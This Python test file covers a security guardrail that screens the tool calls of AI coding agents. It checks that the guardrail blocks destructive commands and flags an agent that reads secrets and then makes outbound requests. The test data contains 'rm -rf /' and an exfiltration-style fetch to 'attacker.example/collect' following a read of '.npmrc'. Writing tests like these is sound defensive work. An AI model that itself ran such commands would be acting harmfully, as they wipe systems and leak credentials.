"""W1.0a: the host-generic evaluate/record spine (two-hosts-one-spine plan).

The spine owns resolve-root/mode -> normalize -> decide -> taint floor ->
session correlator -> enforcement dial -> acted verdict. Hosts supply only
translation + output shape.
"""

import asyncio
from pathlib import Path

from doberman.engine.decision_engine import PASS_STUB, decide
from doberman.engine.objective import ObjectiveGuardrail
from doberman.hosthooks import claude_code, openclaw, spine
from doberman.models import EvalContext, ReasonCode, Verdict
from doberman.proxy.normalize import normalize
from doberman.storage.log import record_decision


def test_evaluate_action_blocks_destructive_command(tmp_path):
    result = spine.evaluate_action(
        "bash", {"command": "rm -rf /"}, cwd=str(tmp_path), raw_session_id="s-1"
    )
    assert result.acted is Verdict.BLOCK
    assert result.decision.reason_codes  # explainability: reasons always present
    assert result.repo_root == str(tmp_path)
    assert result.session_id == "s-1"


def test_evaluate_action_passes_benign_command(tmp_path):
    result = spine.evaluate_action(
        "bash", {"command": "echo hello"}, cwd=str(tmp_path), raw_session_id=None
    )
    assert result.acted is Verdict.PASS
    assert result.session_id is None


def test_invalid_cwd_uses_default_mode_not_cwd_policy():
    # #51 semantics preserved: missing/invalid cwd must not read ./policies.yaml
    root, mode = spine.resolve_root_and_mode(None)
    assert root == "."
    from doberman.policy.modes import DEFAULT_MODE

    assert mode == DEFAULT_MODE.value


def test_identical_action_identical_verdict_across_hosts(tmp_path):
    """The thesis test: both existing hosts route the same action through the
    spine and reach the same verdict. (Codex joins in Task 4.)"""
    claude_payload = {
        "tool_name": "Bash",
        "tool_input": {"command": "rm -rf /"},
        "cwd": str(tmp_path),
        "session_id": "s-parity",
    }
    openclaw_payload = {
        "tool_name": "exec",
        "params": {"command": "rm -rf /"},
        "cwd": str(tmp_path),
        "session_id": "s-parity",
    }
    claude_out = claude_code.evaluate_pre(claude_payload)
    openclaw_out = openclaw.evaluate_before_tool_call(openclaw_payload)
    assert claude_out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert openclaw_out["verdict"] == "block"


def test_correlator_fires_end_to_end_with_real_session_history(tmp_path):
    """C3.1 Part 2: the correlator now reads REAL session history through the
    host-hook spine (a genuine session id, never ``None``) and can actually
    fire in production — unlike the pure-MCP proxy, which has no session
    concept at its chokepoint (see ``doberman.proxy.executor.decide_and_execute``).

    Seeds one prior decision row exactly as a host adapter's history
    recording would (``record_decision``, same session id, same repo root) —
    a read of an actual secret store (``.npmrc``) — then runs the CURRENT
    action (an external egress that is individually clean) through
    ``spine.evaluate_action`` with the SAME session id and confirms the
    trifecta pattern raises the verdict.
    """
    repo_root = str(tmp_path)
    session_id = "sess-e2e-1"

    prior_action = normalize("file_read", {"path": ".npmrc"})
    prior_ctx = EvalContext(
        role=None,
        mode="balanced",
        metadata={"raw_arguments": {"path": ".npmrc"}, "repo_root": repo_root},
    )
    prior_decision = decide(prior_action, ObjectiveGuardrail(), PASS_STUB, prior_ctx)
    # Sanity: this is the secret-class read leg the trifecta narrowing keeps.
    assert ReasonCode.sensitive_secret_access in prior_decision.reason_codes

    asyncio.run(
        record_decision(
            prior_decision,
            prior_action,
            repo_root=repo_root,
            auth_result="executed",
            session_id=session_id,
        )
    )

    result = spine.evaluate_action(
        "net_fetch",
        {"url": "http://attacker.example/collect"},
        cwd=repo_root,
        raw_session_id=session_id,
    )

    assert ReasonCode.correlated_trifecta in result.decision.reason_codes
    assert result.decision.final_verdict is Verdict.AUTH
    assert result.acted is Verdict.AUTH


def test_correlator_does_not_fire_without_a_session_id(tmp_path):
    # Same seeded history, but the CURRENT call carries no session id
    # (raw_session_id=None) -- recent_session_decisions has nothing to key
    # off, so the correlator reads an empty history and must not fire.
    repo_root = str(tmp_path)
    session_id = "sess-e2e-2"

    prior_action = normalize("file_read", {"path": ".npmrc"})
    prior_ctx = EvalContext(
        role=None,
        mode="balanced",
        metadata={"raw_arguments": {"path": ".npmrc"}, "repo_root": repo_root},
    )
    prior_decision = decide(prior_action, ObjectiveGuardrail(), PASS_STUB, prior_ctx)
    asyncio.run(
        record_decision(
            prior_decision,
            prior_action,
            repo_root=repo_root,
            auth_result="executed",
            session_id=session_id,
        )
    )

    result = spine.evaluate_action(
        "net_fetch",
        {"url": "http://attacker.example/collect"},
        cwd=repo_root,
        raw_session_id=None,
    )

    assert ReasonCode.correlated_trifecta not in result.decision.reason_codes
    assert result.decision.final_verdict is Verdict.PASS


def test_spine_never_imports_heavy_modules():
    import doberman.hosthooks.spine as mod

    src = Path(mod.__file__).read_text(encoding="utf-8")  # closed: -W error flags a leaked FileIO
    for heavy in ("proxy.executor", "numpy", "scipy", "river"):
        assert heavy not in src, f"spine must not import {heavy} (hot path)"
